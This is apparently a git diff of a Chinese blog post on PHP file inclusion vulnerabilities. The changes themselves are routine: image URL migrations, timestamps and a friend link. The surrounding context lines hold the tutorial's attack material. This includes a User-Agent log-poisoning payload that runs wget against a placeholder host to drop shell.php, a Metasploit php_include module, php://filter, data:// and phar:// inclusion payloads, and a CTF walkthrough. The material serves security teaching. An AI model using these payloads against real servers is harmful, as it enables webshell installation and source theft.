@@ -150,6 +150,8 @@
             
             <li><a target="_blank" href="http://twosmi1e.com/">2Smile</a></li>
             
+            <li><a target="_blank" href="/www.bugsafe.cn">Poache’s</a></li>
+            
         </ul>
     </div>
 </div>
@@ -726,7 +728,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2018-10-29 22:16:27'>2018-04-23 21:39</time>
+        创建时间:<time class="date" title='更新时间: 2018-11-02 21:52:15'>2018-04-23 21:39</time>
         
     </div>
     <div class="article-meta">
@@ -808,10 +810,10 @@
 <p>include(‘/var/log/apache2/access.log’)，从而成功执行php代码</p>
 <p> ?file=../../../../../../../../../var/log/apache/error.log </p>
 <p>1.</p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201804032017_676.png" alt=""></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804032017_676.png" alt=""></p>
 <p>​   </p>
 <p>2.可以尝试利用UA插入payload到日志文件</p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201804032021_793.png" alt=""></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804032021_793.png" alt=""></p>
 <p>3.MSF攻击模块</p>
 <pre><code>use exploit/unix/webapp/php_include
 set rhost 192.168.159.128
@@ -861,7 +863,7 @@ D:xamppapachelogserror.log
 <p>选择User-Agent 写代码如下：</p>
 <pre><code>&lt;?system(&#39;wget http://www.yourweb.com/oneword.txt -O shell.php&#39;);?&gt;
 </code></pre><p>然后提交请求。</p>
-<h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201805140916_975.png" alt=""></p>
+<h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140916_975.png" alt=""></p>
 <p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
 <p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。另一种方法phpinfo来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要竞争时间包含临时文件拿到webshell。</p>
 <h2 id="有防御的本地文件包含"><a href="#有防御的本地文件包含" class="headerlink" title="有防御的本地文件包含"></a>有防御的本地文件包含</h2><p>文件名后缀固定：在包含的文件名后加固定后缀</p>
@@ -969,7 +971,7 @@ expect:// — 处理交互式的流
 
 POST:
 &lt;? phpinfo();?&gt;
-</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201804032124_161.png" alt=""></p>
+</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804032124_161.png" alt=""></p>
 <p>结果将在index.php所在文件下的文件shell.php内增加”&lt;?php phpinfo();?&gt;”一句话</p>
 <h3 id="利用php流filter："><a href="#利用php流filter：" class="headerlink" title="利用php流filter："></a>利用php流filter：</h3><p>?file=php://filter/convert.base64-encode/resource=index.php</p>
 <p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。</p>
@@ -1002,12 +1004,12 @@ index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
 <p>理解：</p>
 <p>如果服务器只允许包含.php文件，后台代码为：<code>include(xxx + &#39;.php&#39;);</code>，而这个.php文件不可控。但是我们可以上传一个.txt文件，那么我们可以通过phar伪协议来包含这个文件，而且phar协议不以后缀名判断文件类型，所以我们将我们的test.php木马压缩以后改为a.txt文件上传到服务器上，之后可以构造payload：phar://a.txt/test，服务器拼接以后就成为了：phar://a.txt/test.php，即可成功包含 </p>
 <p>姿势：</p>
-<p>假设有个文件phpinfo.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，如下：<br><img src="http://oy0tigw51.bkt.clouddn.com/201805140917_301.png" alt=""></p>
+<p>假设有个文件phpinfo.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，如下：<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140917_301.png" alt=""></p>
 <p>指定绝对路径</p>
 <pre><code>index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt
 </code></pre><p>或者使用相对路径（这里test.zip就在当前目录下）</p>
 <pre><code>index.php?file=phar://test.zip/phpinfo.txt
-</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201805140917_297.png" alt=""></p>
+</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140917_297.png" alt=""></p>
 <h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件：</p>
 <ol>
 <li>php版本大于等于php5.3.0</li>
@@ -1037,10 +1039,10 @@ if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;){
 </code></pre><p>得到源码</p>
 <h3 id="贪婪包含"><a href="#贪婪包含" class="headerlink" title="贪婪包含"></a>贪婪包含</h3><p>iscc2018的一道题目</p>
 <p>打开题目</p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201805140857_654.png" alt=""></p>
-<p>查看源码<img src="http://oy0tigw51.bkt.clouddn.com/201805140858_867.png" alt=""></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140857_654.png" alt=""></p>
+<p>查看源码<img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140858_867.png" alt=""></p>
 <p>知道这里调用show.php?img=1.jpg  访问 并修改1的值</p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201805140901_199.png" alt=""></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140901_199.png" alt=""></p>
 <p>大概可以猜测 文件包含漏洞，尝试</p>
 <pre><code class="php">img=php://filter/read=convert.base64-encode/resource=show.php
 </code></pre>
@@ -1170,13 +1172,13 @@ else{
 <p>我们发现在使用payload3时将文件名改为了flag1.php，而payload2和payload3则是一个.开始，一个/开始。 这和文件长度的奇偶性有关，当为偶数的时候我们选择payload2，为奇数的时候我们选择payload3</p>
 <h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>file_get_contents最常见的文件读取函数</p>
 <p>?dir=/data/web.config</p>
-<h2 id="文件包含利用方式整理"><a href="#文件包含利用方式整理" class="headerlink" title="文件包含利用方式整理"></a>文件包含利用方式整理</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201806161007_364.png" alt=""></p>
+<h2 id="文件包含利用方式整理"><a href="#文件包含利用方式整理" class="headerlink" title="文件包含利用方式整理"></a>文件包含利用方式整理</h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806161007_364.png" alt=""></p>
 <h2 id="中间件安全配置"><a href="#中间件安全配置" class="headerlink" title="中间件安全配置"></a>中间件安全配置</h2><ul>
 <li>magic_qutes_gpc</li>
 <li>限制访问区域</li>
 <li>设置访问权限</li>
 </ul>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201806161021_780.png" alt=""></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806161021_780.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 951207194@qq.com </span>
@@ -1194,7 +1196,7 @@ else{
     <p><span>文章字数:</span><span class="post-count">4,055</span></p>
     <p><span>本文作者:</span><a href="javascript:void(0)" title="Mang0">Mang0</a></p>
     <p><span>发布时间:</span>2018-04-23, 21:39:49</p>
-    <p><span>最后更新:</span>2018-10-29, 22:16:27</p>
+    <p><span>最后更新:</span>2018-11-02, 21:52:15</p>
     <span>原始链接:</span><a class="post-url" href="/archives/844a29d4/" title="php文件包含漏洞">http://mang0.me/archives/844a29d4/</a>
     <p>
         <span>版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
